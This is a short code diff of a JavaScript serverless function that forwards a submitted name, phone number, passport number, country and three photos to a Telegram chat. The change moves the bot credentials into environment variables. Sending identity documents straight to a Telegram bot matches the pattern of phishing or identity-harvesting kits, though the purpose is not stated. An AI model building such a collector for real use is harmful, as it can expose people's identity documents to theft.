@@ -5,28 +5,24 @@ exports.handler = async (event) => {
   try {
     const data = JSON.parse(event.body);
 
-    const BOT = "YOUR_BOT_TOKEN";
-    const CHAT = "YOUR_CHAT_ID";
+    const BOT = process.env.TG_TOKEN;
+    const CHAT = process.env.CHAT_ID;
 
-    const text = `
-New User:
-Name: ${data.name}
-Phone: ${data.phone}
-Passport: ${data.passport}
-Country: ${data.country}
-`;
-
-    // ✅ TEXT
+    // ✅ send text
     await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: CHAT,
-        text: text
+        text: `New User:
+Name: ${data.name}
+Phone: ${data.phone}
+Passport: ${data.passport}
+Country: ${data.country}`
       })
     });
 
-    // ✅ PHOTOS (3)
+    // ✅ send photos
     const photos = [data.photo1, data.photo2, data.photo3];
 
     for (let p of photos) {
@@ -47,16 +43,10 @@ Country: ${data.country}
       }
     }
 
-    return {
-      statusCode: 200,
-      body: "OK"
-    };
+    return { statusCode: 200, body: "OK" };
 
   } catch (err) {
     console.log(err);
-    return {
-      statusCode: 500,
-      body: "Error"
-    };
+    return { statusCode: 500, body: "Error" };
   }
 };
